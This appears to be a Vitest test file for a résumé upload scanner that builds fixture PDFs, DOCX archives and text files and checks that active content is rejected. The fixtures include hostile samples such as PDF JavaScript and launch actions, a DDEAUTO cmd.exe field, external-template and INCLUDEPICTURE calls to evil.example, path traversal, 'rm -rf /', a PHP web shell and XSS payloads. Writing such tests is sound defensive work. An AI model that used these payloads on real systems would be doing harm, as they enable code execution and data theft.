import { deflateRawSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  findActiveContent,
  scanDocxBytes,
  scanPdfBytes,
  scanTextBytes,
  scanUploadBytes,
  UploadRejectedError,
} from "./scan-upload";

const encoder = new TextEncoder();

/* --------------------------------------------------------------------------
 * A tiny ZIP writer, so a .docx of any shape can be built in a test.
 * ------------------------------------------------------------------------ */

type ZipInput = { name: string; data: Buffer | string; store?: boolean; claimUncompressed?: number };

function crc32(buffer: Buffer): number {
  let crc = ~0;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
  }
  return ~crc >>> 0;
}

function zip(files: ZipInput[]): Uint8Array {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const file of files) {
    const raw = Buffer.isBuffer(file.data) ? file.data : Buffer.from(file.data, "utf8");
    const packed = file.store ? raw : deflateRawSync(raw);
    const method = file.store ? 0 : 8;
    const name = Buffer.from(file.name, "utf8");
    const uncompressed = file.claimUncompressed ?? raw.length;

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(0, 10);
    local.writeUInt32LE(crc32(raw), 14);
    local.writeUInt32LE(packed.length, 18);
    local.writeUInt32LE(uncompressed, 22);
    local.writeUInt16LE(name.length, 26);
    local.writeUInt16LE(0, 28);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(0, 12);
    central.writeUInt32LE(crc32(raw), 16);
    central.writeUInt32LE(packed.length, 20);
    central.writeUInt32LE(uncompressed, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);

    locals.push(local, name, packed);
    centrals.push(central, name);
    offset += local.length + name.length + packed.length;
  }

  const directory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(offset, 16);
  end.writeUInt16LE(0, 20);

  return new Uint8Array(Buffer.concat([...locals, directory, end]));
}

const CONTENT_TYPES = `<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const DOCUMENT = `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Head of End User Computing, Barclays, 2019 to present.</w:t></w:r></w:p></w:body></w:document>`;
const DOCUMENT_RELS = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/someone" TargetMode="External"/></Relationships>`;

function docx(extra: ZipInput[] = [], overrides: Partial<Record<"contentTypes" | "document" | "rels", string>> = {}) {
  return zip([
    { name: "[Content_Types].xml", data: overrides.contentTypes ?? CONTENT_TYPES },
    { name: "_rels/.rels", data: `<Relationships/>` },
    { name: "word/document.xml", data: overrides.document ?? DOCUMENT },
    { name: "word/_rels/document.xml.rels", data: overrides.rels ?? DOCUMENT_RELS },
    ...extra,
  ]);
}

function pdf(body: string) {
  return encoder.encode(`%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R ${body} >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n`);
}

function reason(run: () => void): string | null {
  try {
    run();
    return null;
  } catch (caught) {
    if (caught instanceof UploadRejectedError) return caught.reason;
    throw caught;
  }
}

/* --------------------------------------------------------------------------
 * PDF
 * ------------------------------------------------------------------------ */

describe("scanPdfBytes", () => {
  it("accepts an ordinary PDF, including one with a link and a form", () => {
    expect(reason(() => scanPdfBytes(pdf("/OpenAction [3 0 R /Fit] /URI (https://sartho.tech) /AcroForm << >>")))).toBeNull();
  });

  it("accepts a PDF whose header sits after a little leading junk", () => {
    expect(reason(() => scanPdfBytes(encoder.encode("\n\n\u00ef\u00bb\u00bf%PDF-1.7\n%%EOF")))).toBeNull();
  });

  it("refuses bytes that are not a PDF at all", () => {
    expect(reason(() => scanPdfBytes(encoder.encode("<html><script>alert(1)</script></html>")))).toBe("not_pdf");
    expect(reason(() => scanPdfBytes(docx()))).toBe("not_pdf");
  });

  it.each([
    "/OpenAction << /S /JavaScript /JS (app.alert(1)) >>",
    "/AA << /O << /S /JavaScript /JS (this.exportDataObject()) >> >>",
    "/S /Launch /F (cmd.exe)",
    "/Names << /EmbeddedFiles << /Names [(payload.exe) 4 0 R] >> >>",
    "/Type /EmbeddedFile /Length 10",
    "/Subtype /RichMedia",
    "/AcroForm << /XFA 5 0 R >>",
  ])("refuses active content: %s", (body) => {
    expect(reason(() => scanPdfBytes(pdf(body)))).toBe("pdf_active_content");
  });

  it("sees through hex-escaped names", () => {
    expect(reason(() => scanPdfBytes(pdf("/S /J#61vaScript /J#53 (app.alert(1))")))).toBe("pdf_active_content");
  });

  it("does not mistake a longer name for a forbidden one", () => {
    expect(reason(() => scanPdfBytes(pdf("/JSONData 4 0 R /Launcher (x) /XFAB 1")))).toBeNull();
  });
});

/* --------------------------------------------------------------------------
 * DOCX
 * ------------------------------------------------------------------------ */

describe("scanDocxBytes", () => {
  it("accepts an ordinary document with an external hyperlink", () => {
    expect(reason(() => scanDocxBytes(docx()))).toBeNull();
  });

  it("accepts stored (uncompressed) parts", () => {
    expect(reason(() => scanDocxBytes(docx([{ name: "word/styles.xml", data: "<w:styles/>", store: true }])))).toBeNull();
  });

  it("refuses bytes that are not a ZIP, or a ZIP that is not a Word document", () => {
    expect(reason(() => scanDocxBytes(pdf("")))).toBe("not_docx");
    expect(reason(() => scanDocxBytes(zip([{ name: "readme.txt", data: "hello" }])))).toBe("not_docx");
    expect(reason(() => scanDocxBytes(zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES }])))).toBe("not_docx");
    expect(reason(() => scanDocxBytes(encoder.encode("PK\u0003\u0004 not really a zip")))).toBe("not_docx");
  });

  it("refuses macros, by part, by content type and by relationship", () => {
    expect(reason(() => scanDocxBytes(docx([{ name: "word/vbaProject.bin", data: Buffer.from([1, 2, 3]) }])))).toBe("docx_macro");
    expect(reason(() => scanDocxBytes(docx([], {
      contentTypes: CONTENT_TYPES.replace("</Types>", `<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>`),
    })))).toBe("docx_macro");
    expect(reason(() => scanDocxBytes(docx([], {
      rels: `<Relationships><Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>`,
    })))).toBe("docx_macro");
  });

  it("refuses embedded programs, OLE objects and ActiveX", () => {
    expect(reason(() => scanDocxBytes(docx([{ name: "word/embeddings/oleObject1.bin", data: "MZ" }])))).toBe("docx_embedded_object");
    expect(reason(() => scanDocxBytes(docx([{ name: "word/activeX/activeX1.xml", data: "<ax:ocx/>" }])))).toBe("docx_embedded_object");
    expect(reason(() => scanDocxBytes(docx([{ name: "word/media/payload.exe", data: "MZ" }])))).toBe("docx_embedded_object");
    expect(reason(() => scanDocxBytes(docx([], {
      rels: `<Relationships><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/></Relationships>`,
    })))).toBe("docx_embedded_object");
  });

  it("refuses a template fetched from another server", () => {
    expect(reason(() => scanDocxBytes(docx([{
      name: "word/_rels/settings.xml.rels",
      data: `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>`,
    }])))).toBe("docx_external_template");
  });

  it("refuses DDE and include field codes in the body", () => {
    expect(reason(() => scanDocxBytes(docx([], {
      document: DOCUMENT.replace("</w:body>", `<w:p><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r></w:p></w:body>`),
    })))).toBe("docx_field_code");
    expect(reason(() => scanDocxBytes(docx([{
      name: "word/header1.xml",
      data: `<w:hdr><w:p><w:r><w:instrText>INCLUDEPICTURE "http://evil.example/x.png"</w:instrText></w:r></w:p></w:hdr>`,
    }])))).toBe("docx_field_code");
  });

  it("refuses paths that escape the archive", () => {
    expect(reason(() => scanDocxBytes(docx([{ name: "../../etc/passwd", data: "x" }])))).toBe("docx_unsafe_entry");
    expect(reason(() => scanDocxBytes(docx([{ name: "/tmp/x", data: "x" }])))).toBe("docx_unsafe_entry");
  });

  it("refuses an archive that claims to expand far beyond a document", () => {
    expect(reason(() => scanDocxBytes(docx([{ name: "word/media/a.bin", data: "x", claimUncompressed: 40 * 1024 * 1024 }])))).toBe("docx_zip_bomb");
    const bomb = deflateRawSync(Buffer.alloc(0));
    void bomb;
    /* A part that really inflates past the ceiling, with an honest directory entry. */
    const big = Buffer.alloc(3 * 1024 * 1024, 0x41);
    const total = docx(Array.from({ length: 24 }, (_, index) => ({ name: `word/media/${index}.xml`, data: big })));
    expect(reason(() => scanDocxBytes(total))).toBe("docx_zip_bomb");
  });
});

/* --------------------------------------------------------------------------
 * Plain text
 * ------------------------------------------------------------------------ */

describe("scanTextBytes", () => {
  it("returns the decoded text of an ordinary résumé", () => {
    const text = "Bharani Kumar H\nHead of EUC\nJavaScript, TypeScript, C# and <3 for good tooling.\n";
    expect(scanTextBytes(encoder.encode(text))).toBe(text);
  });

  it("refuses binaries wearing a .txt name", () => {
    expect(reason(() => scanTextBytes(pdf("")))).toBe("text_binary");
    expect(reason(() => scanTextBytes(docx()))).toBe("text_binary");
    expect(reason(() => scanTextBytes(new Uint8Array([0x48, 0x69, 0x00, 0x21])))).toBe("text_binary");
    expect(reason(() => scanTextBytes(new Uint8Array([0xff, 0xfe, 0x41, 0x00])))).toBe("text_binary");
  });

  it("refuses scripts and markup that would run", () => {
    expect(reason(() => scanTextBytes(encoder.encode("#!/bin/sh\nrm -rf /")))).toBe("text_active_content");
    expect(reason(() => scanTextBytes(encoder.encode("My CV <script>fetch('https://evil.example')</script>")))).toBe("text_active_content");
    expect(reason(() => scanTextBytes(encoder.encode("<?php system($_GET['c']); ?>")))).toBe("text_active_content");
    expect(reason(() => scanTextBytes(encoder.encode('<img src=x onerror="alert(1)">')))).toBe("text_active_content");
  });
});

/* --------------------------------------------------------------------------
 * Extracted text, whatever it came out of
 * ------------------------------------------------------------------------ */

describe("findActiveContent", () => {
  it("leaves ordinary résumé prose alone, skills and angle brackets included", () => {
    expect(findActiveContent("Built the onboarding flow in JavaScript; grew revenue <5% YoY to >20%.")).toBeNull();
    expect(findActiveContent("Led the <Platform> team; ASP.NET and JSP experience. Growth of <%5.")).toBeNull();
    expect(findActiveContent("Contact: someone@example.com | https://www.linkedin.com/in/someone")).toBeNull();
  });

  it("names the first piece of code it finds", () => {
    expect(findActiveContent("Summary\n<script>alert(1)</script>")).toBe("<script");
    expect(findActiveContent("Click <a href=\"javascript:void(0)\">here</a>")).toBe("javascript:");
    expect(findActiveContent("<iframe src=\"https://evil.example\">")).toBe("<iframe");
    expect(findActiveContent("<%= Request.QueryString %>")).toBe("<%= R");
    expect(findActiveContent("<svg onload=alert(1)>")).toBe("<svg onload=");
  });
});

describe("scanUploadBytes", () => {
  it("dispatches on the format the file claims", () => {
    expect(reason(() => scanUploadBytes("pdf", pdf("")))).toBeNull();
    expect(reason(() => scanUploadBytes("docx", docx()))).toBeNull();
    expect(reason(() => scanUploadBytes("text", encoder.encode("plain")))).toBeNull();
    expect(reason(() => scanUploadBytes("pdf", docx()))).toBe("not_pdf");
    expect(reason(() => scanUploadBytes("docx", pdf("")))).toBe("not_docx");
  });
});
